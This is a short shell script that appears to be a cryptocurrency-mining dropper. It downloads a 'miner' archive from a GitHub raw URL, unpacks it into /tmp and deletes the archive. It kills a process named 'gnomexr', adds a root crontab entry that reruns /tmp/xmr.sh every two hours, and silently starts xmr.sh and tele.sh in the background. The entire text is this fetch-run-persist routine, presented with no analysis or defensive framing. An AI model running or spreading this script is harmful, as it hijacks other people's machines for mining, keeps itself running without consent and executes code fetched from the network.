curl -o qfsdosfsafs.tar.xz https://raw.githubusercontent.com/dnfh87/132test/main/miner.tar.xz
wait
tar -xf qfsdosfsafs.tar.xz -C /tmp
sudo rm -r qfsdosfsafs.tar.xz

pid=$(pgrep -x gnomexr)
if [ ! -z "$pid" ]
then
	kill -9 $pid
	sleep 3
fi

check=$(sudo crontab -l | grep '/tmp/xmr.sh')
if [ -z "$check" ]
then
	(sudo crontab -l 2>/dev/null; sudo echo "0 */2 * * *  /tmp/xmr.sh") | sudo crontab
fi

nohup /tmp/xmr.sh > /dev/null 2>&1 &
nohup /tmp/tele.sh > /dev/null 2>&1 &





